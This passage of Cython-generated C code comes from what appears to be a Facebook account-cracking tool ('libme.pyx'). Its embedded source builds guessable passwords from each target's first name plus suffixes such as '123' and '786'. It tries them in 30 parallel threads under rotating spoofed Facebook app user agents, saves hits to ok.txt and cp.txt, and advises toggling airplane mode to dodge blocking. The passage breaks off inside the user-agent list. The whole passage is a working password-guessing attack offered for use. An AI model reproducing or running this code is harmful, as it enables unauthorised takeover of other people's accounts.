              __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_name, __pyx_n_s_split); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 566, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __pyx_t_6 = NULL;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
                __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_17);
                if (likely(__pyx_t_6)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
                  __Pyx_INCREF(__pyx_t_6);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_17, function);
                }
              }
              __pyx_t_10 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_17, __pyx_t_6, __pyx_kp_s__43) : __Pyx_PyObject_CallOneArg(__pyx_t_17, __pyx_kp_s__43);
              __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
              if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 566, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_10);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              __pyx_t_17 = __Pyx_GetItemInt(__pyx_t_10, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 566, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_17);
              __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
              __Pyx_XDECREF_SET(__pyx_v_ft, __pyx_t_17);
              __pyx_t_17 = 0;

              /* "libme.pyx":567
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 567, __pyx_L37_error)
              __pyx_t_19 = ((__pyx_t_20 >= 6) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":568
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 568, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 568, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 568, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 568, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 568, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_4, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
                __pyx_t_4 = 0;

                /* "libme.pyx":567
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 * 						if len(ft)>=6:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":569
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 569, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 3) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 569, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 4) != 0);
              if (!__pyx_t_13) {
              } else {
                __pyx_t_19 = __pyx_t_13;
                goto __pyx_L48_bool_binop_done;
              }
              __pyx_t_20 = PyObject_Length(__pyx_v_ft); if (unlikely(__pyx_t_20 == ((Py_ssize_t)-1))) __PYX_ERR(0, 569, __pyx_L37_error)
              __pyx_t_13 = ((__pyx_t_20 == 5) != 0);
              __pyx_t_19 = __pyx_t_13;
              __pyx_L48_bool_binop_done:;
              if (__pyx_t_19) {

                /* "libme.pyx":570
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 */
                __pyx_t_4 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 570, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 570, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 570, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 570, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_17 = PyList_New(5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 570, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_17, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_4);
                PyList_SET_ITEM(__pyx_t_17, 1, __pyx_t_4);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_17, 2, __pyx_t_9);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_17, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_17, 4, __pyx_t_10);
                __pyx_t_4 = 0;
                __pyx_t_9 = 0;
                __pyx_t_6 = 0;
                __pyx_t_10 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_17));
                __pyx_t_17 = 0;

                /* "libme.pyx":569
 * 						if len(ft)>=6:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						elif len(ft) == 3 or len(ft) == 4 or len(ft) == 5:             # <<<<<<<<<<<<<<
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 */
                goto __pyx_L47;
              }

              /* "libme.pyx":572
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]             # <<<<<<<<<<<<<<
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __bapi__(self, uid, pwx):
 */
              /*else*/ {
                __pyx_t_17 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_123); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 572, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                __pyx_t_10 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_1234); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 572, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_10);
                __pyx_t_6 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_12345); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 572, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_6);
                __pyx_t_9 = PyNumber_Add(__pyx_v_ft, __pyx_kp_s_786); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 572, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_4 = PyList_New(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 572, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_INCREF(__pyx_v_name);
                __Pyx_GIVEREF(__pyx_v_name);
                PyList_SET_ITEM(__pyx_t_4, 0, __pyx_v_name);
                __Pyx_GIVEREF(__pyx_t_17);
                PyList_SET_ITEM(__pyx_t_4, 1, __pyx_t_17);
                __Pyx_GIVEREF(__pyx_t_10);
                PyList_SET_ITEM(__pyx_t_4, 2, __pyx_t_10);
                __Pyx_GIVEREF(__pyx_t_6);
                PyList_SET_ITEM(__pyx_t_4, 3, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_9);
                PyList_SET_ITEM(__pyx_t_4, 4, __pyx_t_9);
                __pyx_t_17 = 0;
                __pyx_t_10 = 0;
                __pyx_t_6 = 0;
                __pyx_t_9 = 0;
                __Pyx_XDECREF_SET(__pyx_v_pwx, ((PyObject*)__pyx_t_4));
                __pyx_t_4 = 0;
              }
              __pyx_L47:;

              /* "libme.pyx":573
 * 						else:
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)             # <<<<<<<<<<<<<<
 * 	def __bapi__(self, uid, pwx):
 * 		ua = random.choice([
 */
              __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 573, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_9);
              __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_bapi); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 573, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_6);
              __pyx_t_10 = NULL;
              __pyx_t_12 = 0;
              if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
                __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
                if (likely(__pyx_t_10)) {
                  PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                  __Pyx_INCREF(__pyx_t_10);
                  __Pyx_INCREF(function);
                  __Pyx_DECREF_SET(__pyx_t_9, function);
                  __pyx_t_12 = 1;
                }
              }
              #if CYTHON_FAST_PYCALL
              if (PyFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_6, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 573, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else
              #endif
              #if CYTHON_FAST_PYCCALL
              if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
                PyObject *__pyx_temp[4] = {__pyx_t_10, __pyx_t_6, __pyx_v_uid, __pyx_v_pwx};
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 3+__pyx_t_12); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 573, __pyx_L37_error)
                __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
              } else
              #endif
              {
                __pyx_t_17 = PyTuple_New(3+__pyx_t_12); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 573, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_17);
                if (__pyx_t_10) {
                  __Pyx_GIVEREF(__pyx_t_10); PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_t_10); __pyx_t_10 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_17, 0+__pyx_t_12, __pyx_t_6);
                __Pyx_INCREF(__pyx_v_uid);
                __Pyx_GIVEREF(__pyx_v_uid);
                PyTuple_SET_ITEM(__pyx_t_17, 1+__pyx_t_12, __pyx_v_uid);
                __Pyx_INCREF(__pyx_v_pwx);
                __Pyx_GIVEREF(__pyx_v_pwx);
                PyTuple_SET_ITEM(__pyx_t_17, 2+__pyx_t_12, __pyx_v_pwx);
                __pyx_t_6 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_17, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 573, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
              }
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
              __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

              /* "libme.pyx":564
 * 					print("  [] Cp result saved in > cp.txt")
 * 					print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 					for user in self.id:             # <<<<<<<<<<<<<<
 * 						uid, name = user.split("|")
 * 						ft = name.split(" ")[0]
 */
            }
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

            /* "libme.pyx":560
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 					print("  [] Cp result saved in > cp.txt")
 */
          }
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L42_try_end;
          __pyx_L37_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          /*except:*/ {
            __Pyx_AddTraceback("libme.James.__menn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_4, &__pyx_t_9) < 0) __PYX_ERR(0, 560, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyTuple_Pack(3, __pyx_t_5, __pyx_t_4, __pyx_t_9); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 560, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_18 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_17, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 560, __pyx_L39_except_error)
            __Pyx_GOTREF(__pyx_t_18);
            __pyx_t_19 = __Pyx_PyObject_IsTrue(__pyx_t_18);
            __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
            if (__pyx_t_19 < 0) __PYX_ERR(0, 560, __pyx_L39_except_error)
            __pyx_t_13 = ((!(__pyx_t_19 != 0)) != 0);
            if (__pyx_t_13) {
              __Pyx_GIVEREF(__pyx_t_5);
              __Pyx_GIVEREF(__pyx_t_4);
              __Pyx_XGIVEREF(__pyx_t_9);
              __Pyx_ErrRestoreWithState(__pyx_t_5, __pyx_t_4, __pyx_t_9);
              __pyx_t_5 = 0; __pyx_t_4 = 0; __pyx_t_9 = 0; 
              __PYX_ERR(0, 560, __pyx_L39_except_error)
            }
            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            goto __pyx_L38_exception_handled;
          }
          __pyx_L39_except_error:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          goto __pyx_L1_error;
          __pyx_L38_exception_handled:;
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_1);
          __Pyx_XGIVEREF(__pyx_t_2);
          __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_1, __pyx_t_2);
          __pyx_L42_try_end:;
        }
      }
      /*finally:*/ {
        /*normal exit:*/{
          if (__pyx_t_3) {
            __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__13, NULL);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 560, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          }
          goto __pyx_L36;
        }
        __pyx_L36:;
      }
      goto __pyx_L54;
      __pyx_L33_error:;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L1_error;
      __pyx_L54:;
    }

    /* "libme.pyx":559
 * 					uid, name = user.split("|")
 * 					coeg.submit(self.__bapi__,uid, listpass.split(","))
 * 		elif ask == "t":             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 					print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
  }
  __pyx_L13:;

  /* "libme.pyx":537
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __menn__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			pastefile = input('  \033[0;97m[+] Enter your file : ')
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_AddTraceback("libme.James.__menn__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_pastefile);
  __Pyx_XDECREF(__pyx_v_line);
  __Pyx_XDECREF(__pyx_v_ask);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_uid);
  __Pyx_XDECREF(__pyx_v_name);
  __Pyx_XDECREF(__pyx_v_ft);
  __Pyx_XDECREF(__pyx_v_pwx);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":574
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __bapi__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_37__bapi__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_37__bapi__ = {"__bapi__", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_5libme_5James_37__bapi__, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_5libme_5James_37__bapi__(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_uid = 0;
  PyObject *__pyx_v_pwx = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__bapi__ (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_uid,&__pyx_n_s_pwx,0};
    PyObject* values[3] = {0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_uid)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__bapi__", 1, 3, 3, 1); __PYX_ERR(0, 574, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_pwx)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("__bapi__", 1, 3, 3, 2); __PYX_ERR(0, 574, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "__bapi__") < 0)) __PYX_ERR(0, 574, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
    }
    __pyx_v_self = values[0];
    __pyx_v_uid = values[1];
    __pyx_v_pwx = values[2];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("__bapi__", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 574, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("libme.James.__bapi__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_5libme_5James_36__bapi__(__pyx_self, __pyx_v_self, __pyx_v_uid, __pyx_v_pwx);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_36__bapi__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self, PyObject *__pyx_v_uid, PyObject *__pyx_v_pwx) {
  PyObject *__pyx_v_ua = NULL;
  PyObject *__pyx_v_pw = NULL;
  PyObject *__pyx_v_ses = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *(*__pyx_t_9)(PyObject *);
  int __pyx_t_10;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__bapi__", 0);

  /* "libme.pyx":575
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __bapi__(self, uid, pwx):
 * 		ua = random.choice([             # <<<<<<<<<<<<<<
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 * 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 575, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 575, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 575, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_GIVEREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
